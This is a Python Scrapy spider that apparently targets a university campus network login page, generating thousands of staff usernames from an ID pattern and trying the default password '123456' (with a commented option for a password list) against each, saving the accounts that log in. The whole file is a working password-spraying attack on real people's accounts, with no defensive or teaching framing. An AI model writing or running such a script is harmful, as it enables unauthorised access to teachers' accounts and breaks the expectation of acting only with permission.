# -*- coding: utf-8 -*-
"""crawl NJUPT teachers' accounts
    # year = 1960  # this is year
    # xxx = 000  # this is a random number
    # password = 000000"""
import os
import sys
from multiprocessing import Pool
import threading
import scrapy
import re
from NjuptDrCom.items import NjuptDrComItem as Item


class TeacherAccountSpider(scrapy.Spider):
    """crawl NJUPT teachers' accounts"""
    name = 'account'
    start_urls = ['http://192.168.168.168/0.htm']

    def __init__(self):
        super(TeacherAccountSpider, self).__init__()
        self.username = ''
        self.password = '123456'
        self.count = 0

    def parse(self, response):
        with Pool(5) as pool: #I find this useless
            path = os.path.abspath(os.path.dirname(sys.argv[0]))
            usernames = [
                '10100' + str(year) + '0' + '%03d' % xxx + '00'
                for year in range(2009, 2017)
                for xxx in range(0, 1000)
                ]
            # passwords = []
            # with open(path + '/password_list.txt', 'r') as f:
            #     passwords.extend(f.readlines()[:200])
            tasks = [
                (response, username, self.password, self.check_parse)
                for username in usernames
                # for password in passwords
            ]
        for task in tasks:
            self.count += 1
            if self.count % 100 == 0:
                threading.current_thread().join(20)
            yield self.mulprocessstar(task)

    def check_parse(self, response):
        """check the spacific value to know whether our login is successful"""
        body = str(response.request.body)
        username_re = re.compile('[0-9]{14}')
        password_re = re.compile('[0-9]{6}')
        print(body)
        username = username_re.findall(body)[0]
        password = password_re.findall(body)[-1]
        # username = body[-29:-14]
        # password = body[-7:-1]
        print(username, password)
        status = response.xpath('//input/@value').extract()
        result = ''.join(map(str, status))
        if '\u8fd4' in result:
            return {}
        elif result == "":
            item = Item()
            item['username'] = username
            item['password'] = password
            yield item
        else:
            err_item = Item()
            err_item['error_username'] = username
            err_item['error_password'] = password
            return err_item

    def mulprocessstar(self, args):
        return self.mulprocess(*args)

    def mulprocess(self, response, username, password, parse):
        """use to request username and password"""
        return scrapy.FormRequest.from_response(
            response=response,
            formdata={
                'DDDDD': username,
                'upass': password
            },
            callback=parse
            )
